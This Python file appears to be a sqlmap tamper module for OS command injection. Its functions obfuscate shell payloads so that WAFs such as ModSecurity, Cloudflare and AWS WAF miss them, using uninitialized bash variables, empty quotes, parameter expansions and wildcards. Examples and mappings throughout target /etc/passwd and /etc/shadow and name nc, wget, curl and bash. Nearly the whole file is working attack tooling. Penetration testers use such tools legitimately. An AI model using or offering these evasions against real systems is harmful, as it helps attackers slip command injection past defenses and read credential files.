#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import re
import string

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Uses uninitialized bash/shell variables for OS command injection bypass

    Requirement:
        * OS command injection contexts
        * Bash/sh shell on target

    Tested against:
        * ModSecurity CRS
        * Cloudflare WAF
        * AWS WAF
        * Regex-based WAFs

    Notes:
        * Wrong regular expression based filters can be evaded with uninitialized bash variables
        * Such value equal to null and acts like empty strings
        * Bash and perl allow such kind of interpretations
        * Example: /bin/cat /etc/passwd -> /bin/cat$u /etc/passwd$u
        * The $u variable is uninitialized and equals empty string

    Reference:
        * https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/

    >>> tamper('/bin/cat /etc/passwd')
    '/bin/cat$u /etc/passwd$u'
    """

    if not payload:
        return payload

    retVal = payload
    
    # Simple uninitialized variable
    uninit_var = "$u"
    
    # Add uninitialized var after path components
    # /bin/cat -> /bin/cat$u
    retVal = re.sub(
        r'(/\w+)',
        lambda m: "%s%s" % (m.group(1), uninit_var),
        retVal
    )
    
    # Add after common commands
    commands = ["cat", "ls", "id", "whoami", "pwd", "uname", "nc", "wget", "curl", "bash", "sh"]
    for cmd in commands:
        pattern = re.compile(r'\b(%s)\b' % cmd, re.IGNORECASE)
        retVal = pattern.sub(r'\1' + uninit_var, retVal)
    
    return retVal


def tamper_position_based(payload, **kwargs):
    """
    Position-based obfuscation with uninitialized variables
    More aggressive - adds variables at multiple positions
    
    Example: /bin/cat /etc/shadow -> $u/bin$u/cat$u $u/etc$u/shadow$u
    """
    
    if not payload:
        return payload
    
    retVal = payload
    uninit_var = "$u"
    
    # Add before and after slashes
    retVal = re.sub(r'/', "%s/%s" % (uninit_var, uninit_var), retVal)
    
    # Add after spaces
    retVal = re.sub(r' ', " %s" % uninit_var, retVal)
    
    return retVal


def tamper_random_vars(payload, **kwargs):
    """
    Uses random variable names for additional obfuscation
    
    Example: /bin/cat /etc/passwd -> $aaa/bin$bbb/cat$ccc $ddd/etc$eee/passwd$fff
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    def random_var():
        length = random.randint(3, 7)
        return "$" + ''.join(random.choices(string.ascii_lowercase, k=length))
    
    # Add random vars after path components
    retVal = re.sub(
        r'(/\w+)',
        lambda m: "%s%s" % (m.group(1), random_var()),
        retVal
    )
    
    # Add random vars after spaces
    retVal = re.sub(
        r'(\s+)',
        lambda m: "%s%s" % (m.group(1), random_var()),
        retVal
    )
    
    return retVal


def tamper_env_vars(payload, **kwargs):
    """
    Uses existing environment variables that evaluate to empty or predictable values
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Environment variables that might be empty or predictable
    env_vars = [
        "${u}",           # Unset variable
        "${!u}",          # Indirect reference to unset
        "${u-}",          # Default value (empty)
        "${u:-}",         # Default value with null check
        "${#u}",          # Length of unset (0)
        "$@",             # All arguments (might be empty)
        "${*}",           # All arguments
    ]
    
    # Insert env vars at word boundaries
    words = retVal.split()
    new_words = []
    
    for word in words:
        var = random.choice(env_vars)
        # Add var at random position in word
        if '/' in word:
            parts = word.split('/')
            new_parts = [p + var for p in parts if p]
            new_word = var.join([''] + new_parts)
        else:
            new_word = word + var
        new_words.append(new_word)
    
    retVal = ' '.join(new_words)
    
    return retVal


def tamper_quotes_and_vars(payload, **kwargs):
    """
    Combines quotes with uninitialized variables
    
    Example: /bin/cat /etc/shadow -> /bi'n'''/c''at' /e'tc'/sh''ad'ow
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Pattern: insert empty quotes randomly in words
    def insert_quotes(word):
        result = ""
        for char in word:
            result += char
            if random.random() > 0.7 and char.isalpha():
                result += random.choice(["''", '""', "'", '"'])
        return result
    
    words = retVal.split()
    new_words = [insert_quotes(w) for w in words]
    retVal = ' '.join(new_words)
    
    return retVal


def tamper_wildcard(payload, **kwargs):
    """
    Uses wildcards for command obfuscation
    
    Example: /bin/cat /etc/passwd -> /???/??t /???/??ss??
    
    Notes:
        * ? matches any single character
        * * matches any string
        * This works in bash/sh for file paths
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Common command replacements with wildcards
    wildcard_map = {
        "/bin/cat": "/???/??t",
        "/bin/ls": "/???/l?",
        "/bin/id": "/???/i?",
        "/bin/sh": "/???/s?",
        "/bin/bash": "/???/b?sh",
        "/bin/nc": "/???/n?",
        "/etc/passwd": "/???/??ss??",
        "/etc/shadow": "/???/??ad??",
        "/etc/hosts": "/???/??st?",
    }
    
    for original, wildcard in wildcard_map.items():
        retVal = retVal.replace(original, wildcard)
    
    return retVal
